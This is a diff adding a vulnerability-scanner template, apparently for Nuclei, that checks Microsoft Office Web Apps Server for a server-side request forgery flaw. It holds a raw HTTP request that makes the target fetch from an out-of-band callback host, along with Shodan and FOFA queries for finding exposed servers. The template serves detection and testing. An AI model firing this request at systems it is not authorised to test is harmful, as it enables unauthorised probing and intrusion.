@@ -1,0 +1,37 @@
+id: office-webapps-ssrf
+
+info:
+  name: Office Web Apps Server Full Read - Server Side Request Forgery
+  author: DhiyaneshDK
+  severity: high
+  description: Office Web Apps Server Full Read is vulnerable to SSRF.
+  reference:
+    - https://drive.google.com/file/d/1aeNq_5wVwHRR1np1jIRQM1hocrgcZ6Qu/view (Slide 37,38)
+  classification:
+    cpe: cpe:2.3:a:microsoft:office_web_apps_server:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"Provide a link that opens Word"
+    fofa-query: body="Provide a link that opens Word"
+    product: office_web_apps_server
+    vendor: microsoft
+  tags: microsoft,office-webapps,redirect
+variables:
+  oast: "{{interactsh-url}}"
+  string: "{{to_lower(rand_text_alpha(4))}}"
+
+http:
+  - raw:
+      - |
+        GET /oh/wopi/files/@/wFileId/contents?wFileId=http://{{oast}}/{{string}}.xlsx%3fbody={{string}}%26header=Location:http://oast.pro%26status=302&access_token_ttl=0 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')
+          - contains(body,'<h1> Interactsh Server </h1>')
+          - status_code == 200
+        condition: and
+# digest: 490a00463044022016297b715eb2af4653f98753aa1aae1493e2fa762a40720334a04691560fdd8702202bc8b1ba739e034aaab536bc06483d3010b854fa630185a801ca2e643e6f6700:922c64590222798bb761d5b6d8e72950
